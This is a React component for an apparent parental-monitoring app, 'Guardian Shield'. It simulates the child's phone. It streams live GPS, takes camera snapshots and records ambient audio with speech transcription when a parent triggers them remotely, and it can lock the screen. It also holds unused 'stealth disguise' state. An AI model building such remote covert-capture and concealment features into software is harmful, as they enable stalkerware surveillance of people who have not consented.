import React, { useState, useEffect, useRef } from 'react';
import { ChildDeviceState, AudioClipItem, DeviceFile, CameraPosition } from '../types';
import { 
  Smartphone, 
  Lock, 
  CheckCircle2, 
  ShieldAlert, 
  Globe, 
  EyeOff, 
  AlertTriangle, 
  Wifi, 
  Battery, 
  Camera, 
  Settings, 
  Sparkles, 
  Mic, 
  MapPin, 
  RefreshCw, 
  Eye, 
  Shield, 
  Upload, 
  Volume2, 
  Clock, 
  Play, 
  Square,
  FileText,
  Activity,
  Check
} from 'lucide-react';

interface ChildDeviceSimulatorProps {
  deviceState: ChildDeviceState;
  onUpdateChildState: (updates: Partial<ChildDeviceState>) => void;
  onTriggerSOS: () => void;
  onOpenSetupGuide: () => void;
  onSendCommand?: (command: string, payload?: any) => void;
}

export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
  deviceState,
  onUpdateChildState,
  onTriggerSOS,
  onOpenSetupGuide,
  onSendCommand
}) => {
  const [browserUrl, setBrowserUrl] = useState('https://kids.nationalgeographic.com');
  const [customWebText, setCustomWebText] = useState('Explore amazing facts about wild animals, science, space, and historic events.');
  const [sosAlertSent, setSosAlertSent] = useState(false);
  const [isRecordingAudio, setIsRecordingAudio] = useState(false);
  const [recordingSeconds, setRecordingSeconds] = useState(0);

  // Real Hardware State
  const [locationPermission, setLocationPermission] = useState<'granted' | 'denied' | 'prompt'>('prompt');
  const [cameraPermission, setCameraPermission] = useState<'granted' | 'denied' | 'prompt'>('prompt');
  const [micPermission, setMicPermission] = useState<'granted' | 'denied' | 'prompt'>('prompt');
  const [storagePermission, setStoragePermission] = useState<'granted' | 'denied' | 'prompt'>('prompt');

  const [isCapturingCamera, setIsCapturingCamera] = useState(false);
  const [realBattery, setRealBattery] = useState<number | null>(null);
  const [pairingCode, setPairingCode] = useState<string>(deviceState.pairingCode || '592-104');
  
  // Stealth Disguise Simulator
  const [isDisguised, setIsDisguised] = useState(false);
  const [activeScreenInDisguise, setActiveScreenInDisguise] = useState<'home' | 'settings' | 'apps' | 'appInfo'>('home');
  const [currentTimeStr, setCurrentTimeStr] = useState('');

  // Live Screen Share
  const [isRealSharing, setIsRealSharing] = useState(false);
  const [mediaStream, setMediaStream] = useState<MediaStream | null>(null);

  // Audio Recorder Ref
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const audioChunksRef = useRef<Blob[]>([]);
  const speechRecognizerRef = useRef<any>(null);
  const fileInputRef = useRef<HTMLInputElement | null>(null);

  // Live Clock Update
  useEffect(() => {
    const updateClock = () => {
      const d = new Date();
      setCurrentTimeStr(d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }));
    };
    updateClock();
    const timer = setInterval(updateClock, 1000);
    return () => clearInterval(timer);
  }, []);

  // 1. Automatic Real Hardware Detection & Persistent Pairing Code
  useEffect(() => {
    let savedCode = localStorage.getItem('child_pairing_code');
    if (!savedCode) {
      const codePart1 = Math.floor(100 + Math.random() * 900);
      const codePart2 = Math.floor(100 + Math.random() * 900);
      savedCode = `${codePart1}-${codePart2}`;
      localStorage.setItem('child_pairing_code', savedCode);
    }
    setPairingCode(savedCode);

    // Auto-detect real phone model
    const ua = navigator.userAgent;
    let detectedModel = "Android Mobile Device";
    if (ua.includes("Samsung") || ua.includes("SM-")) detectedModel = "Samsung Galaxy Device";
    else if (ua.includes("Xiaomi") || ua.includes("Redmi")) detectedModel = "Xiaomi / Redmi Device";
    else if (ua.includes("Pixel")) detectedModel = "Google Pixel Device";
    else if (ua.includes("iPhone")) detectedModel = "Apple iPhone";

    onUpdateChildState({
      pairingCode: savedCode,
      deviceModel: detectedModel,
      isOnline: true,
      lastSeen: "Live Now"
    });

    // Real Battery Listener
    if ('getBattery' in navigator) {
      (navigator as any).getBattery().then((battery: any) => {
        const updateBattery = () => {
          const lvl = Math.round(battery.level * 100);
          setRealBattery(lvl);
          onUpdateChildState({ 
            batteryLevel: lvl, 
            isCharging: battery.charging,
            pairingCode: savedCode || ''
          });
        };
        updateBattery();
        battery.addEventListener('levelchange', updateBattery);
        battery.addEventListener('chargingchange', updateBattery);
      }).catch(() => {});
    }
  }, []);

  // 2. Continuous Real GPS Geolocation Watcher
  useEffect(() => {
    if (navigator.geolocation) {
      const watchId = navigator.geolocation.watchPosition(
        (position) => {
          setLocationPermission('granted');
          const lat = position.coords.latitude;
          const lng = position.coords.longitude;
          
          onUpdateChildState({
            location: {
              lat,
              lng,
              address: `Live Real GPS (${lat.toFixed(5)}, ${lng.toFixed(5)})`,
              speed: Math.round((position.coords.speed || 0) * 3.6),
              accuracy: Math.round(position.coords.accuracy),
              altitude: Math.round(position.coords.altitude || 0),
              timestamp: new Date().toISOString(),
              batteryAtLocation: realBattery || deviceState.batteryLevel
            }
          });
        },
        (err) => {
          console.warn("GPS watch info:", err.message);
        },
        { enableHighAccuracy: true, maximumAge: 5000, timeout: 10000 }
      );
      return () => navigator.geolocation.clearWatch(watchId);
    }
  }, [realBattery]);

  // 3. Reactive Camera Snapshot on Remote Parent Trigger
  const prevCameraRef = useRef(deviceState.activeCamera);
  useEffect(() => {
    if (deviceState.activeCamera && deviceState.activeCamera !== 'off' && prevCameraRef.current !== deviceState.activeCamera) {
      prevCameraRef.current = deviceState.activeCamera;
      requestRealCamera(deviceState.activeCamera as CameraPosition);
    }
  }, [deviceState.activeCamera]);

  // 4. Reactive Ambient Audio Stream on Remote Parent Trigger
  const prevAudioListenRef = useRef(deviceState.audioState?.isListening);
  useEffect(() => {
    if (deviceState.audioState?.isListening && !isRecordingAudio) {
      startRealAudioRecording();
    } else if (!deviceState.audioState?.isListening && isRecordingAudio) {
      stopRealAudioRecording();
    }
  }, [deviceState.audioState?.isListening]);

  // Real GPS Geolocation Request Manual Fallback
  const requestRealLocation = () => {
    if (!navigator.geolocation) {
      alert("GPS is not supported by this device.");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        setLocationPermission('granted');
        const lat = position.coords.latitude;
        const lng = position.coords.longitude;
        
        onUpdateChildState({
          location: {
            lat,
            lng,
            address: `Live Mobile GPS (${lat.toFixed(5)}, ${lng.toFixed(5)})`,
            speed: Math.round((position.coords.speed || 0) * 3.6),
            accuracy: Math.round(position.coords.accuracy),
            altitude: Math.round(position.coords.altitude || 0),
            timestamp: new Date().toISOString(),
            batteryAtLocation: realBattery || deviceState.batteryLevel
          }
        });
      },
      (err) => {
        setLocationPermission('denied');
        console.warn("Location permission:", err.message);
      },
      { enableHighAccuracy: true }
    );
  };

  // Real Camera Capture
  const requestRealCamera = async (cameraPos: CameraPosition = 'front') => {
    try {
      setIsCapturingCamera(true);
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: cameraPos === 'front' ? 'user' : 'environment', width: { ideal: 640 }, height: { ideal: 480 } } 
      });
      setCameraPermission('granted');

      const videoEl = document.createElement('video');
      videoEl.srcObject = stream;
      videoEl.setAttribute('playsinline', 'true');
      videoEl.muted = true;
      await videoEl.play();

      const canvas = document.createElement('canvas');
      canvas.width = 640;
      canvas.height = 480;
      const ctx = canvas.getContext('2d');
      ctx?.drawImage(videoEl, 0, 0, 640, 480);
      const dataUrl = canvas.toDataURL('image/jpeg', 0.75);

      stream.getTracks().forEach(track => track.stop());
      setIsCapturingCamera(false);

      onUpdateChildState({
        latestCameraSnapshot: dataUrl,
        cameraSnapshotTimestamp: new Date().toISOString(),
        isCameraStreaming: true,
        activeCamera: cameraPos
      });
    } catch (err: any) {
      setIsCapturingCamera(false);
      setCameraPermission('denied');
      console.warn("Camera permission error:", err.message);
    }
  };

  // Real Web Audio Microphone Recording & Live Speech Recognition
  const startRealAudioRecording = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      setMicPermission('granted');
      setIsRecordingAudio(true);
      setRecordingSeconds(0);
      audioChunksRef.current = [];

      const mediaRecorder = new MediaRecorder(stream);
      mediaRecorderRef.current = mediaRecorder;

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          audioChunksRef.current.push(e.data);
        }
      };

      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunksRef.current, { type: 'audio/webm' });
        const reader = new FileReader();
        reader.readAsDataURL(audioBlob);
        reader.onloadend = () => {
          const base64Audio = reader.result as string;
          const newClip: AudioClipItem = {
            id: `clip-${Date.now()}`,
            title: `Ambient Voice Clip (${new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })})`,
            timestamp: `Today, ${new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}`,
            duration: `00:${recordingSeconds < 10 ? '0' : ''}${recordingSeconds}`,
            transcript: "Live ambient voice clip captured from child phone microphone.",
            audioData: base64Audio,
            severity: 'safe'
          };

          if (onSendCommand) {
            onSendCommand('SAVE_AUDIO_CLIP', { clip: newClip });
          }
        };
        stream.getTracks().forEach(track => track.stop());
      };

      mediaRecorder.start();

      const SpeechClass = (window as any).SpeechRecognition || (window as any).webkitSpeechRecognition;
      if (SpeechClass) {
        const recognizer = new SpeechClass();
        recognizer.continuous = true;
        recognizer.interimResults = true;
        recognizer.onresult = (event: any) => {
          const transcript = Array.from(event.results)
            .map((result: any) => result[0].transcript)
            .join(' ');
          onUpdateChildState({
            audioState: {
              ...deviceState.audioState,
              isListening: true,
              lastTranscript: transcript || "Spoken voice detected."
            }
          });
        };
        recognizer.start();
        speechRecognizerRef.current = recognizer;
      }
    } catch (err: any) {
      setMicPermission('denied');
      setIsRecordingAudio(false);
      console.warn("Microphone access error:", err.message);
    }
  };

  const stopRealAudioRecording = () => {
    if (mediaRecorderRef.current && mediaRecorderRef.current.state !== 'inactive') {
      mediaRecorderRef.current.stop();
    }
    if (speechRecognizerRef.current) {
      try { speechRecognizerRef.current.stop(); } catch (e) {}
    }
    setIsRecordingAudio(false);
    onUpdateChildState({
      audioState: {
        ...deviceState.audioState,
        isListening: false
      }
    });
  };

  const handleSOS = () => {
    setSosAlertSent(true);
    onTriggerSOS();
    requestRealLocation();
    setTimeout(() => setSosAlertSent(false), 5000);
  };

  return (
    <div className="max-w-md mx-auto my-4 bg-slate-900 rounded-3xl border-4 border-slate-700 shadow-2xl overflow-hidden flex flex-col text-slate-100 min-h-[680px]">
      
      {/* Phone Status Bar */}
      <div className="bg-slate-950 px-6 py-3 flex items-center justify-between text-xs text-slate-400 border-b border-slate-800">
        <span className="font-semibold tracking-wide text-slate-300">{currentTimeStr}</span>
        <div className="flex items-center space-x-3">
          <div className="flex items-center space-x-1 text-emerald-400">
            <Activity className="w-3.5 h-3.5 animate-pulse" />
            <span className="text-[10px] font-bold">LIVE CLOUD</span>
          </div>
          <div className="flex items-center space-x-1">
            <Wifi className="w-3.5 h-3.5 text-slate-300" />
            <span>{realBattery !== null ? `${realBattery}%` : `${deviceState.batteryLevel}%`}</span>
            <Battery className="w-4 h-4 text-emerald-400 fill-emerald-400" />
          </div>
        </div>
      </div>

      {/* Main Agent UI Container */}
      <div className="flex-1 p-5 flex flex-col justify-between space-y-4">
        
        {/* Header Badge */}
        <div className="bg-slate-800/80 border border-slate-700/80 rounded-2xl p-4 flex items-center justify-between">
          <div className="flex items-center space-x-3">
            <div className="w-10 h-10 rounded-xl bg-orange-500/20 border border-orange-500/40 flex items-center justify-center text-orange-400">
              <Shield className="w-6 h-6" />
            </div>
            <div>
              <h2 className="font-bold text-white text-base">Guardian Shield</h2>
              <p className="text-xs text-emerald-400 flex items-center space-x-1">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping"></span>
                <span>Active Protection Daemon</span>
              </p>
            </div>
          </div>
          <button
            onClick={() => onOpenSetupGuide()}
            className="p-2 rounded-xl bg-slate-700 hover:bg-slate-600 text-slate-300 transition"
            title="Stealth & Permissions Guide"
          >
            <Settings className="w-4 h-4" />
          </button>
        </div>

        {/* Pairing Code Card */}
        <div className="bg-gradient-to-br from-indigo-950/60 to-slate-800/90 border border-indigo-500/30 rounded-2xl p-5 text-center shadow-lg">
          <span className="text-xs font-semibold uppercase tracking-wider text-indigo-300">Device Connection Code</span>
          <div className="text-3xl font-black tracking-widest text-transparent bg-clip-text bg-gradient-to-r from-orange-400 via-amber-300 to-emerald-400 my-2 font-mono">
            {pairingCode}
          </div>
          <p className="text-xs text-slate-400">
            Enter this code on your Parent Dashboard at <br />
            <span className="text-indigo-400 font-medium underline">https://guardian-shield.onrender.com</span>
          </p>
        </div>

        {/* Live Hardware Telemetry Matrix */}
        <div className="grid grid-cols-2 gap-3">
          
          {/* GPS Status */}
          <div 
            onClick={requestRealLocation}
            className="bg-slate-800/60 hover:bg-slate-800 border border-slate-700/60 rounded-xl p-3 cursor-pointer transition flex flex-col justify-between"
          >
            <div className="flex items-center justify-between mb-1">
              <span className="text-[11px] font-semibold text-slate-400 uppercase">GPS Location</span>
              <MapPin className="w-4 h-4 text-orange-400" />
            </div>
            <div className="text-xs font-bold text-slate-200 truncate">
              {deviceState.location.lat.toFixed(4)}, {deviceState.location.lng.toFixed(4)}
            </div>
            <span className="text-[10px] text-emerald-400 mt-1 flex items-center">
              <Check className="w-3 h-3 mr-0.5" /> High Accuracy
            </span>
          </div>

          {/* Battery Status */}
          <div className="bg-slate-800/60 border border-slate-700/60 rounded-xl p-3 flex flex-col justify-between">
            <div className="flex items-center justify-between mb-1">
              <span className="text-[11px] font-semibold text-slate-400 uppercase">Battery</span>
              <Battery className="w-4 h-4 text-emerald-400" />
            </div>
            <div className="text-xs font-bold text-slate-200">
              {realBattery !== null ? `${realBattery}%` : `${deviceState.batteryLevel}%`}
              {deviceState.isCharging ? ' ⚡ Charging' : ' 🔋 On Battery'}
            </div>
            <span className="text-[10px] text-slate-400 mt-1">Live Hardware Sync</span>
          </div>

          {/* Camera Status */}
          <div 
            onClick={() => requestRealCamera('front')}
            className="bg-slate-800/60 hover:bg-slate-800 border border-slate-700/60 rounded-xl p-3 cursor-pointer transition flex flex-col justify-between"
          >
            <div className="flex items-center justify-between mb-1">
              <span className="text-[11px] font-semibold text-slate-400 uppercase">Camera</span>
              <Camera className="w-4 h-4 text-indigo-400" />
            </div>
            <div className="text-xs font-bold text-slate-200">
              {isCapturingCamera ? 'Capturing...' : 'Front & Rear Ready'}
            </div>
            <span className="text-[10px] text-indigo-400 mt-1">Tap for live test</span>
          </div>

          {/* Microphone Status */}
          <div 
            onClick={isRecordingAudio ? stopRealAudioRecording : startRealAudioRecording}
            className={`border rounded-xl p-3 cursor-pointer transition flex flex-col justify-between ${
              isRecordingAudio 
                ? 'bg-rose-950/60 border-rose-500/50 text-rose-300' 
                : 'bg-slate-800/60 hover:bg-slate-800 border-slate-700/60'
            }`}
          >
            <div className="flex items-center justify-between mb-1">
              <span className="text-[11px] font-semibold text-slate-400 uppercase">Microphone</span>
              <Mic className={`w-4 h-4 ${isRecordingAudio ? 'text-rose-400 animate-pulse' : 'text-amber-400'}`} />
            </div>
            <div className="text-xs font-bold text-slate-200">
              {isRecordingAudio ? `Streaming (${recordingSeconds}s)` : 'Ambient Audio'}
            </div>
            <span className={`text-[10px] mt-1 ${isRecordingAudio ? 'text-rose-400' : 'text-amber-400'}`}>
              {isRecordingAudio ? 'Recording active' : 'Tap to record clip'}
            </span>
          </div>

        </div>

        {/* SOS Emergency Alert Button */}
        <div className="pt-2">
          <button
            onClick={handleSOS}
            className={`w-full py-4 rounded-2xl font-bold text-base flex items-center justify-center space-x-2 transition shadow-lg ${
              sosAlertSent
                ? 'bg-emerald-600 text-white animate-bounce'
                : 'bg-gradient-to-r from-rose-600 to-red-600 hover:from-rose-500 hover:to-red-500 text-white shadow-rose-900/40'
            }`}
          >
            <ShieldAlert className="w-5 h-5" />
            <span>{sosAlertSent ? '✓ SOS Emergency Dispatched!' : '🚨 Send Instant SOS Alert'}</span>
          </button>
        </div>

      </div>

      {/* Screen Lock Real Fullscreen Overlay */}
      {deviceState.isLocked && (
        <div className="fixed inset-0 z-50 bg-slate-950/95 backdrop-blur-md flex flex-col items-center justify-center p-6 text-center">
          <div className="w-20 h-20 rounded-full bg-rose-500/20 border-2 border-rose-500/50 flex items-center justify-center text-rose-500 mb-6 animate-pulse">
            <Lock className="w-10 h-10" />
          </div>
          <h2 className="text-2xl font-black text-white mb-2">Screen Access Locked</h2>
          <p className="text-sm text-slate-300 max-w-xs mb-8 bg-slate-900 border border-slate-800 rounded-xl p-4">
            {deviceState.customLockMessage || "Parental override lock is active. Please contact your parents."}
          </p>
          <div className="text-xs text-slate-500">
            Guardian Shield Safety System
          </div>
        </div>
      )}

    </div>
  );
};
